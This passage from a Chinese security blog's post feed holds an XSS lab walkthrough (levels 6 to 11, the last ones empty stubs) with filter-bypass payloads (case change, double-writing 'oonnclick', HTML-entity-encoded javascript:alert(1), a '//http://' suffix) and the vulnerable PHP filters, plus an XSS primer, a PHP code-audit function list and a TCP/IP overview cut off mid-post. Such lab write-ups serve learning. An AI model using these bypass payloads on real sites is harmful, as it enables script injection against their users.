class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h4><p>这次的代码没有转小写<code>strtolower</code>，利用大写即可绕过，当我发现还过滤<code>data</code>的时候，我就看出来了我知识还不够，我好像还没用过<code>data</code>。</p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p><strong>双写绕过</strong></p><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><p><code>die&quot; oonnclick=&#39;alert(1)&#39;</code></p><h3 id="前台代码-6"><a href="#前台代码-6" class="headerlink" title="前台代码"></a>前台代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和on <span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span> herf相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">level7.php</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot; &lt;&gt; herf&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h4><p>根据上面的经验，再次输入<code>on &lt;script&gt; herf</code>点击搜索。发现<code>on</code>和<code>script</code>直接被替换成空，但是<code>href</code>没有被替换，我们再使用a标签试试。发现<code>script</code>还是被干了，试试双写。绕过成功，顺利进行下一关！</p><h3 id="后台代码-6"><a href="#后台代码-6" class="headerlink" title="后台代码"></a>后台代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h4><p>这关的考点就是<code>str_replace</code>函数，所以本地试一下。<br><img src="https://img.xpctf.cn/img/20200606200805.png"><br>由实验结果可得，<code>str_replace</code>函数只会进行一次替换，所以使用双写绕过。</p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p><strong>HTML实体编码绕过</strong></p><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p><h3 id="前台代码-7"><a href="#前台代码-7" class="headerlink" title="前台代码"></a>前台代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;die<span class="symbol">&amp;quot;</span> oonnclick=&#x27;alert(1)&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">添加友情链接</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">BR</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;die&amp;quot oo_nnclick=&#x27;alert(1)&#x27;&quot;</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level8.jpg</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h4><p>level8前台风格都变了，可能难度升级了。go~go~go~，别管那么多先把level7的payload输入进去看看结果，发现两个地方都有返回，猜测考点可能在a标签上，直接输入<code>javascript:alert(1)</code>试试，发现<code>javascript</code>被替换成<code>javascr_ipt</code>,试试大小写和双写绕过，都无果。最后使用HTML实体编码进行绕过，在线网站点<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">这里</a></p><h3 id="后台代码-7"><a href="#后台代码-7" class="headerlink" title="后台代码"></a>后台代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="comment">//*************代码部分删减*************</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>str_replace</code>函数我们见的已经够多了，把参数3中出现参数1的字符串用参数2替换。这次连双引号<code>&quot;</code>已进行了实体编码，这关考点就是HTML实体编码，所以度娘恶补HTML实体编码的姿势。</p><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p><strong>HTML实体编码、注释代码</strong></p><h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</code></p><h3 id="前台代码-8"><a href="#前台代码-8" class="headerlink" title="前台代码"></a>前台代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;die\<span class="symbol">&amp;quot;</span> oonnclick=\&#x27;alert(1)\&#x27;http://&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">name</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">添加友情链接</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">BR</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;die\&amp;quot oo_nnclick=\&#x27;alert(1)\&#x27;http://&quot;</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level9.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-16"><a href="#代码分析-16" class="headerlink" title="代码分析"></a>代码分析</h4><p>经过我的不断摸索，发现必须包含<code>http://</code>，否则就会<code>&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;</code>,并且对<code>&lt;&gt;&quot;&#39;</code>等符号进行处理，当前是不能构造闭合，根据level8的经验咱试试html实体编码，前台不会解码。我们看后台代码把~阿巴阿巴</p><h3 id="后台代码-8"><a href="#后台代码-8" class="headerlink" title="后台代码"></a>后台代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-17"><a href="#代码分析-17" class="headerlink" title="代码分析"></a>代码分析</h4><p>看了后台代码，符合我们之前的猜想，level9在level8的基础上加了一个<code>http://</code>检测，那我们在level8的payload后面加一个<code>http://</code>,虽然绕过了检测，但是破坏了html的语法。度娘吧~<br>查看大佬解析得知，在level8的payload后面加一个<code>//http://</code>即可绕过，因为后台规定必须包含<code>http://</code>，但如果直接加上，会破坏html的语法，所以加<code>//</code>注释掉后面的语句。</p><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p><strong>1</strong></p><h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><h3 id="前台代码-9"><a href="#前台代码-9" class="headerlink" title="前台代码"></a>前台代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>没有找到和\&#x27;\<span class="symbol">&amp;quot;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;gt;</span>相关的结果.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">search</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="代码分析-18"><a href="#代码分析-18" class="headerlink" title="代码分析"></a>代码分析</h4><p>我们发现有三个<code>input</code>标签，但是<code>type(类型)</code>是<code>hidden</code>,我们把它删了，显示出来三个编辑框。<br>【图片】<br>我们构造三个get参数请求<code>http://172.19.4.8/xss-lab/level10.php?keyword=1&amp;t_link=Die&amp;t_link=Die&amp;t_sort=Die</code>，<code>t_sort</code>顺利解析，下面就是构造payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_link&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_history&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;Die&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="后台代码-9"><a href="#后台代码-9" class="headerlink" title="后台代码"></a>后台代码</h3><h4 id="代码分析-19"><a href="#代码分析-19" class="headerlink" title="代码分析"></a>代码分析</h4><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p><strong>1</strong></p><h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h3><h3 id="前台代码-10"><a href="#前台代码-10" class="headerlink" title="前台代码"></a>前台代码</h3><h4 id="代码分析-20"><a href="#代码分析-20" class="headerlink" title="代码分析"></a>代码分析</h4><h3 id="后台代码-10"><a href="#后台代码-10" class="headerlink" title="后台代码"></a>后台代码</h3><h4 id="代码分析-21"><a href="#代码分析-21" class="headerlink" title="代码分析"></a>代码分析</h4><h2 id="level"><a href="#level" class="headerlink" title="level"></a>level</h2><p><strong>1</strong></p><h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h3><h3 id="前台代码-11"><a href="#前台代码-11" class="headerlink" title="前台代码"></a>前台代码</h3><h4 id="代码分析-22"><a href="#代码分析-22" class="headerlink" title="代码分析"></a>代码分析</h4><h3 id="后台代码-11"><a href="#后台代码-11" class="headerlink" title="后台代码"></a>后台代码</h3><h4 id="代码分析-23"><a href="#代码分析-23" class="headerlink" title="代码分析"></a>代码分析</h4>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞学习 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞学习笔记</title>
      <link href="/posts/1a19/"/>
      <url>/posts/1a19/</url>
      
        <content type="html"><![CDATA[<h2 id="一、认识XSS"><a href="#一、认识XSS" class="headerlink" title="一、认识XSS"></a>一、认识XSS</h2><h3 id="1-百度概念"><a href="#1-百度概念" class="headerlink" title="1.百度概念"></a>1.百度概念</h3><p>  人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS。<br>跨站脚本攻击（XSS），是最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。<br>攻击者可以使用户在浏览器中执行其预定义的恶意脚本，其导致的危害可想而知，如劫持用户会话，插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖XSS蠕虫，甚至破坏网站、修改路由器配置信息等。<br>XSS漏洞可以追溯到上世纪90年代。大量的网站曾遭受XSS漏洞攻击或被发现此类漏洞，如Twitter、Facebook、MySpace、Orkut、新浪微博和百度贴吧。研究表明，最近几年XSS已经超过缓冲区溢出成为最流行的攻击方式，有68%的网站可能遭受此类攻击。根据开放网页应用安全计划（Open Web Application Security Project）公布的2010年统计数据，在Web安全威胁前10位中，XSS排名第2，仅次于代码注入（Injection）。</p><h3 id="2-常见类型"><a href="#2-常见类型" class="headerlink" title="2.常见类型"></a>2.常见类型</h3><p><strong>危害：存储型&gt;反射型&gt;DOM型</strong></p><ul><li><p>存储型<br><img src="https://img.xpctf.cn/img/20200606091712.png" alt="存储型"><br>攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。因为存储型XSS的代码存在于网页的代码中，可以说是永久型的。一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p></li><li><p>反射型<br><img src="https://img.xpctf.cn/img/20200606091023.png" alt="反射型"><br>反射型是最为常见的XSS漏洞类型，它是一种非持久性的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。这里插入的恶意代码并没有保存在目标网站，需要引诱用户点击一个链接到目标网站的恶意链接来实施攻击。</p></li></ul><p>参考文章：<a href="https://www.jianshu.com/p/a15c411e4c92">反射型XSS</a></p><ul><li>DOM型</li></ul><p>参考文章:<a href="https://www.cnblogs.com/mysticbinary/p/12542695.html">DOM-XSS攻击原理与防御</a></p><h2 id="二、发现漏洞"><a href="#二、发现漏洞" class="headerlink" title="二、发现漏洞"></a>二、发现漏洞</h2><h3 id="1-漏洞的出现"><a href="#1-漏洞的出现" class="headerlink" title="1.漏洞的出现"></a>1.漏洞的出现</h3><p><strong>数据交互的地方：</strong></p><ul><li>GET POST Cookie Headers</li><li>反馈与浏览</li><li>富文本编辑器</li><li>留言板</li><li>评论</li><li>各类标签插入和自定义</li></ul><p><strong>数据输出的地方：</strong></p><ul><li>用户资料</li><li>关键词、标签、说明</li><li>文件上传</li></ul><h3 id="2-检测漏洞"><a href="#2-检测漏洞" class="headerlink" title="2.检测漏洞"></a>2.检测漏洞</h3><p>输入一些javascript脚本或者特殊符号，查看前台代码是否过滤，无过滤则漏洞可能存在XSS漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞学习 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web代码审计常见函数</title>
      <link href="/posts/fbe3/"/>
      <url>/posts/fbe3/</url>
      
        <content type="html"><![CDATA[<p><strong>代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。 软件代码审计是对编程项目中源代码的全面分析，旨在发现错误，安全漏洞或违反编程约定。 它是防御性编程范例的一个组成部分，它试图在软件发布之前减少错误。</strong></p><ul><li>require ‘flag.php’#文件包含函数(高)</li><li>count($value)   #获取数组成员数(低)</li><li>chr($value)   #转ascii<br><img src="https://img.xpctf.cn/img/20200604095334.png" alt="PHP会对$value进行256的mod运算，取余"></li><li>unset($value)     #销毁变量</li><li>intval($value)        #转整数<br><img src="https://img.xpctf.cn/img/20200604101527.png" alt="PHP5 无法处理16进制字符串"></li><li>ereg(表达式,字符串,regs)<br>ereg函数是php4-5的正则匹配函数，如果没有找到匹配或出错则返回 FALSE。如果没有传递入可选参数 regs 或者所匹配的字符串长度为 0，则本函数返回 1。ereg函数在php7中已弃用，存在%00截断漏洞。</li><li>is_numeric($value)#判断是否为数字或者数字字符串，bool型</li><li>empty#判断一个变量是否被认为是空的。当一个变量并不存在，或者它的值等同于FALSE，那么它会被认为不存在。如果变量不存在的话，empty()并不会产生警告。bool型</li><li>preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] ) : int<br>preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</li><li>json_encode — 对变量进行 JSON 编码<br>这个编码不是值把json格式的编码，是把其他格式的编码成json，和json_decode没关系。</li><li>json_decode — 对 JSON 格式的字符串进行解码<br>这个解密是指识别json格式的字符串，不和base64那种一个编码一个解密一样，和json_encode没关系。</li><li>strcmp — 二进制安全字符串比较<br>比较两个字符串，如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</li><li>eregi — 不区分大小写的正则表达式匹配<br>本函数和 ereg() 完全相同，只除了在匹配字母字符时忽略大小写的区别。</li><li>strpos — 查找字符串首次出现的位置<br>完全匹配返回0，不完全匹配返回首次出现的位置；匹配失败返回flase</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP/IP协议分层详解</title>
      <link href="/posts/e36b/"/>
      <url>/posts/e36b/</url>
      
        <content type="html"><![CDATA[<h2 id="一、TCP-x2F-IP-和-ISO-x2F-OSI"><a href="#一、TCP-x2F-IP-和-ISO-x2F-OSI" class="headerlink" title="一、TCP&#x2F;IP 和 ISO&#x2F;OSI"></a>一、TCP&#x2F;IP 和 ISO&#x2F;OSI</h2><p><img src="https://img.xpctf.cn/img/20200603184356.png"></p><p>　　ISO&#x2F;OSI模型，即开放式通信系统互联参考模型（Open System Interconnection Reference Model），是国际标准化组织（ISO）提出的一个试图使各种计算机在世界范围内互连为网络的标准框架，简称OSI。<br>　　TCP&#x2F;IP协议模型（Transmission Control Protocol&#x2F;Internet Protocol），包含了一系列构成互联网基础的网络协议，是Internet的核心协议，通过20多年的发展已日渐成熟，并被广泛应用于局域网和广域网中，目前已成为事实上的国际标准。TCP&#x2F;IP协议簇是一组不同层次上的多个协议的组合，通常被认为是一个四层协议系统，与OSI的七层模型相对应。　　</p><h2 id="二、TCP-x2F-IP分层模型"><a href="#二、TCP-x2F-IP分层模型" class="headerlink" title="二、TCP&#x2F;IP分层模型"></a>二、TCP&#x2F;IP分层模型</h2><p><img src="https://img.xpctf.cn/img/20200603184705.png"></p><ul><li><p>应用层<br>应用层决定了向用户提供应用服务时通信的活动。 应用层负责处理特定的应用程序细节。<br>TCP&#x2F;IP 协议族内预存了各类通用的应用服务。比如，FTP（File Transfer Protocol，文件传输协议）和 DNS（Domain Name System，域名解析）服务就是其中两类。 HTTP 协议也处于该层。</p></li><li><p>传输层<br>传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。<br>在传输层有两个性质不同的协议：TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报 协议）。</p></li><li><p>网络层<br>　　网络层用来处理在网络上流动的数据包。数据包是网络传输的最小数 据单位。该层规定了通过怎样的路径（所谓的传输路线）到达对方计 算机，并把数据包传送给对方。</p></li></ul><p>　　